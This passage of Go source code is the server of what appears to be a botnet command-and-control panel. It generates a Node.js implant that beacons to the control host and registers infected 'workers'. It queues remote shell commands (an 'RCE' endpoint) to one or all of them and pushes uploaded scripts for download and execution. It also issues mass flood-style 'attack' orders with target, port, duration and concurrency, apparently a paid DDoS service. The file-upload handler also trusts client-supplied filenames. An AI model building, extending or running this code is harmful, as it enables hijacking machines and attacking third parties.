	if body.BinaryPath != "" {
		wkr.BinaryPath = body.BinaryPath
	}
	wkr.LastHeartbeat = time.Now()

	storage.SaveWorker(wkr)
	jsonSuccess(w, map[string]string{"status": "ok"})
}

func handleWorkerInject(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}

	var body struct {
		ServerID   string `json:"server_id"`
		WorkerType string `json:"worker_type"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}

	if body.ServerID == "" {
		jsonError(w, "server_id is required", 400)
		return
	}

	v, ok := botConnections.Load(body.ServerID)
	if !ok {
		jsonError(w, "Server not found", 404)
		return
	}
	server := v.(BotConnection)

	wkr := Worker{
		ID:           generateID(),
		ServerID:     body.ServerID,
		ServerIP:     server.IP,
		WorkerType:   body.WorkerType,
		Status:       "injecting",
		PID:          0,
		Port:         0,
		BinaryPath:   "",
		LastHeartbeat: time.Now(),
		CreatedAt:    time.Now(),
		InstalledBy:  user.Username,
	}
	storage.SaveWorker(wkr)

	cmd := map[string]interface{}{
		"action":      "inject",
		"worker_id":   wkr.ID,
		"server_id":   body.ServerID,
		"worker_type": body.WorkerType,
		"cnc_url":     fmt.Sprintf("http://%s", r.Host),
	}
	publishCommand(cmd)

	jsonSuccess(w, wkr)
}

// ─── GitHub Config ────────────────────────────────────────────────────

func handleGitHubConfig(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	if r.Method == "GET" {
		cfg, err := storage.GetGitHubConfig()
		if err != nil {
			jsonError(w, "internal error", 500)
			return
		}
		jsonSuccess(w, cfg)
		return
	}

	if r.Method == "PUT" || r.Method == "POST" {
		var body struct {
			RepoURL  string `json:"repo_url"`
			Token    string `json:"token"`
			Branch   string `json:"branch"`
			FilePath string `json:"file_path"`
			Enabled  *bool  `json:"enabled"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			jsonError(w, "Invalid request body", 400)
			return
		}

		cfg := GitHubConfig{
			ID:       "main",
			RepoURL:  body.RepoURL,
			Token:    body.Token,
			Branch:   body.Branch,
			FilePath: body.FilePath,
			Enabled:  false,
		}
		if body.Enabled != nil {
			cfg.Enabled = *body.Enabled
		}
		if cfg.Branch == "" {
			cfg.Branch = "main"
		}
		if cfg.FilePath == "" {
			cfg.FilePath = "master.json"
		}

		storage.SaveGitHubConfig(cfg)
		jsonSuccess(w, cfg)
		return
	}

	jsonError(w, "method not allowed", 405)
}

// ─── Generate Worker Script ──────────────────────────────────────────

func handleGenerateWorkerScript(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}

	var body struct {
		ServerIP string `json:"server_ip"`
		Port     string `json:"port"`
	}
	body.Port = "8080"
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}

	workerID := generateID()
	script := fmt.Sprintf(`#!/usr/bin/env node
const https = require("https");
const fs = require("fs");
const path = require("path");
const { execSync, spawn } = require("child_process");

const CNC_HOST = %q;
const CNC_PORT = %q;
const WORKER_ID = %q;

function heartbeat() {
	const data = JSON.stringify({ worker_id: WORKER_ID, pid: process.pid, port: 0, status: "running" });
	const req = https.request({ hostname: CNC_HOST, port: CNC_PORT, path: "/api/v1/workers/heartbeat", method: "POST", headers: { "Content-Type": "application/json", "Content-Length": data.length } }, () => {});
	req.write(data);
	req.end();
}

setInterval(heartbeat, 30000);
heartbeat();
console.log("levl7 worker " + WORKER_ID + " running on " + CNC_HOST);
`, body.ServerIP, body.Port, workerID)

	w.Header().Set("Content-Type", "application/javascript")
	w.Header().Set("Content-Disposition", "attachment; filename=worker-"+workerID+".js")
	w.Write([]byte(script))
}

// ─── Worker Registration (unauthenticated) ──────────────────────────
var workerCommands = &sync.Map{} // worker_id -> []Command

func handleWorkerRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}

	var body struct {
		Hostname string `json:"hostname"`
		Arch     string `json:"arch"`
		Platform string `json:"platform"`
		CPUs     int    `json:"cpus"`
		TotalMem int64  `json:"totalmem"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}

	wkr := Worker{
		ID:        generateID(),
		ServerID:  body.Hostname,
		ServerIP:  strings.Split(r.RemoteAddr, ":")[0],
		WorkerType: body.Arch + "/" + body.Platform,
		Status:    "registered",
		PID:       0,
		Port:      0,
		CreatedAt: time.Now(),
		LastHeartbeat: time.Now(),
	}
	storage.SaveWorker(wkr)
	workersMap.Store(wkr.ID, wkr)

	jsonSuccess(w, map[string]interface{}{
		"worker_id": wkr.ID,
		"server_id": wkr.ServerID,
		"status":    "registered",
	})
}

// ─── Worker Commands ─────────────────────────────────────────────────
func handleWorkerCommands(w http.ResponseWriter, r *http.Request) {
	workerID := strings.TrimPrefix(r.URL.Path, "/api/v1/workers/commands/")
	workerID = strings.TrimPrefix(workerID, "/api/workers/commands/")

	if r.Method == "GET" {
		cmds := []interface{}{}
		v, ok := workerCommands.Load(workerID)
		if ok {
			cmds = v.([]interface{})
			workerCommands.Delete(workerID)
		}
		jsonSuccess(w, map[string]interface{}{"commands": cmds})
		return
	}

	jsonError(w, "method not allowed", 405)
}

func handleWorkerSendCommand(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}

	var body struct {
		WorkerID string      `json:"worker_id"`
		Command  interface{} `json:"command"`
		Target   string      `json:"target"`
		Method   string      `json:"method"`
		Port     string      `json:"port"`
		Time     int         `json:"time"`
		Action   string      `json:"action"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}

	cmd := map[string]interface{}{
		"action":  body.Action,
		"target":  body.Target,
		"method":  body.Method,
		"port":    body.Port,
		"time":    body.Time,
		"attack_id": generateID(),
		"from":    user.Username,
	}

	if body.WorkerID == "all" {
		workerCommands.Range(func(k, _ interface{}) bool {
			existing, _ := workerCommands.LoadOrStore(k, []interface{}{})
			workerCommands.Store(k, append(existing.([]interface{}), cmd))
			return true
		})
	} else {
		existing, _ := workerCommands.LoadOrStore(body.WorkerID, []interface{}{})
		workerCommands.Store(body.WorkerID, append(existing.([]interface{}), cmd))
	}

	jsonSuccess(w, map[string]interface{}{"sent": true, "attack_id": cmd["attack_id"]})
}

// ─── Script Upload & Management ──────────────────────────────────────
func handleUploadScript(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	if r.Method == "GET" {
		scripts := []map[string]string{}
		os.MkdirAll("scripts", 0755)
		files, _ := os.ReadDir("scripts")
		for _, f := range files {
			if !f.IsDir() {
				info, _ := f.Info()
				scripts = append(scripts, map[string]string{
					"name": f.Name(),
					"size": fmt.Sprintf("%d", info.Size()),
					"url":  "/scripts/" + f.Name(),
				})
			}
		}
		jsonSuccess(w, scripts)
		return
	}

	if r.Method == "POST" {
		r.Body = http.MaxBytesReader(w, r.Body, 50<<20)
		r.ParseMultipartForm(50 << 20)
		file, handler, err := r.FormFile("file")
		if err != nil {
			jsonError(w, "file is required", 400)
			return
		}
		defer file.Close()

		os.MkdirAll("scripts", 0755)
		name := handler.Filename
		dst, err := os.Create("scripts/" + name)
		if err != nil {
			jsonError(w, "failed to save", 500)
			return
		}
		defer dst.Close()
		io.Copy(dst, file)

		jsonSuccess(w, map[string]string{"name": name, "url": "/scripts/" + name})
		return
	}

	jsonError(w, "method not allowed", 405)
}

func handleDeployScript(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}

	var body struct {
		ScriptName string `json:"script_name"`
		WorkerID   string `json:"worker_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}

	scriptURL := fmt.Sprintf("http://%s/scripts/%s", r.Host, body.ScriptName)
	cmd := map[string]interface{}{
		"action":     "download",
		"url":        scriptURL,
		"name":       body.ScriptName,
		"deploy_by":  user.Username,
	}

	if body.WorkerID == "all" {
		workerCommands.Range(func(k, _ interface{}) bool {
			existing, _ := workerCommands.LoadOrStore(k, []interface{}{})
			workerCommands.Store(k, append(existing.([]interface{}), cmd))
			return true
		})
	} else {
		existing, _ := workerCommands.LoadOrStore(body.WorkerID, []interface{}{})
		workerCommands.Store(body.WorkerID, append(existing.([]interface{}), cmd))
	}

	jsonSuccess(w, map[string]interface{}{"deployed": true, "script": body.ScriptName})
}

// ─── Worker RCE ──────────────────────────────────────────────────────
func handleWorkerRCE(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}

	var body struct {
		WorkerID string `json:"worker_id"`
		Command  string `json:"command"`
		Timeout  int    `json:"timeout"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}

	if body.WorkerID == "" {
		jsonError(w, "worker_id is required", 400)
		return
	}
	if body.Command == "" {
		jsonError(w, "command is required", 400)
		return
	}
	if body.Timeout <= 0 {
		body.Timeout = 30
	}

	cmdID := generateID()
	cmd := map[string]interface{}{
		"action":     "rce",
		"command":    body.Command,
		"timeout":    body.Timeout,
		"cmd_id":     cmdID,
		"from":       user.Username,
		"created_at": time.Now().Format(time.RFC3339),
	}

	if body.WorkerID == "all" {
		count := 0
		workerCommands.Range(func(k, _ interface{}) bool {
			existing, _ := workerCommands.LoadOrStore(k, []interface{}{})
			workerCommands.Store(k, append(existing.([]interface{}), cmd))
			count++
			return true
		})
		jsonSuccess(w, map[string]interface{}{"sent": true, "cmd_id": cmdID, "target_count": count})
	} else {
		existing, _ := workerCommands.LoadOrStore(body.WorkerID, []interface{}{})
		workerCommands.Store(body.WorkerID, append(existing.([]interface{}), cmd))
		jsonSuccess(w, map[string]interface{}{"sent": true, "cmd_id": cmdID, "target": body.WorkerID})
	}
}

// ─── Worker Result ───────────────────────────────────────────────────
var workerResults = &sync.Map{} // cmd_id -> result

func handleWorkerResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}

	var body struct {
		WorkerID string `json:"worker_id"`
		CmdID    string `json:"cmd_id"`
		OK       bool   `json:"ok"`
		Output   string `json:"output"`
		Error    string `json:"error"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}

	workerResults.Store(body.CmdID, body)
	jsonSuccess(w, map[string]string{"status": "received"})
}

func handleGetWorkerResult(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	if r.Method != "GET" {
		jsonError(w, "method not allowed", 405)
		return
	}

	cmdID := strings.TrimPrefix(r.URL.Path, "/api/v1/workers/result/")
	cmdID = strings.TrimPrefix(cmdID, "/api/workers/result/")

	v, ok := workerResults.Load(cmdID)
	if !ok {
		jsonError(w, "result not found", 404)
		return
	}

	jsonSuccess(w, v)
}

// ─── Mass Command ────────────────────────────────────────────────────
func handleMassCommand(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}

	var body struct {
		Action      string `json:"action"`
		Target      string `json:"target"`
		Method      string `json:"method"`
		Port        string `json:"port"`
		Time        int    `json:"time"`
		Concurrents int    `json:"concurrents"`
		Rpc         int    `json:"rpc"`
		Command     string `json:"command"`
		ScriptName  string `json:"script_name"`
		Args        string `json:"args"`
		Flags       string `json:"flags"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}

	cmd := map[string]interface{}{
		"action":      body.Action,
		"attack_id":   generateID(),
		"from":        user.Username,
		"created_at":  time.Now().Format(time.RFC3339),
	}

	switch body.Action {
	case "attack":
		cmd["target"] = body.Target
		cmd["method"] = body.Method
		cmd["port"] = body.Port
		cmd["time"] = body.Time
		cmd["concurrents"] = body.Concurrents
		cmd["rpc"] = body.Rpc
	case "method":
		cmd["target"] = body.Target
		cmd["method"] = body.Method
		cmd["port"] = body.Port
		cmd["time"] = body.Time
		cmd["concurrents"] = body.Concurrents
		cmd["flags"] = body.Args
		if v, ok := methodList.Load(body.Method); ok {
			cmd["script_name"] = v.(Method).ScriptName
			if cmd["flags"] == "" {
				cmd["flags"] = v.(Method).Flags
			}
		}
	case "exec", "rce":
		cmd["command"] = body.Command
	case "run":
		cmd["script"] = body.ScriptName
		cmd["args"] = body.Args
	case "download":
		if body.ScriptName != "" {
			cmd["url"] = fmt.Sprintf("http://%s/scripts/%s", r.Host, body.ScriptName)
			cmd["name"] = body.ScriptName
		}
	}

	count := 0
	workerCommands.Range(func(k, _ interface{}) bool {
		existing, _ := workerCommands.LoadOrStore(k, []interface{}{})
		workerCommands.Store(k, append(existing.([]interface{}), cmd))
		count++
		return true
	})

	jsonSuccess(w, map[string]interface{}{
		"sent":      true,
		"attack_id": cmd["attack_id"],
		"count":     count,
	})
}

// ─── Create Method from Script ────────────────────────────────────────
func handleMethodFromScript(w http.ResponseWriter, r *http.Request) {
	user, ok := getTokenUser(r)
	if !ok || user.Rule != "Admin" {
		jsonError(w, "Unauthorized", 403)
		return
	}

	if r.Method != "POST" {
		jsonError(w, "method not allowed", 405)
		return
	}

	var body struct {
		Method      string `json:"method"`
		Description string `json:"description"`
		ScriptName  string `json:"script_name"`
		Flags       string `json:"flags"`
		Premium     bool   `json:"premium"`
		Concurrents int    `json:"concurrents"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		jsonError(w, "Invalid request body", 400)
		return
	}

	if body.Method == "" || body.ScriptName == "" {
		jsonError(w, "method and script_name are required", 400)
		return
	}

	if _, exists := methodList.Load(body.Method); exists {
		jsonError(w, "Method already exists", 409)
		return
	}

	// Verify script exists
	os.MkdirAll("scripts", 0755)
	if _, err := os.Stat("scripts/" + body.ScriptName); os.IsNotExist(err) {
		jsonError(w, "Script file not found", 404)
		return
	}

	m := Method{
		Method:      body.Method,
		Description: body.Description,
		ScriptName:  body.ScriptName,
		Flags:       body.Flags,
		Premium:     body.Premium,
		Concurrents: body.Concurrents,
	}
	if m.Concurrents == 0 {
		m.Concurrents = 1
	}
	SaveMethod(m)

	jsonSuccess(w, map[string]interface{}{"success": true, "method": m.Method, "script": m.ScriptName})
}
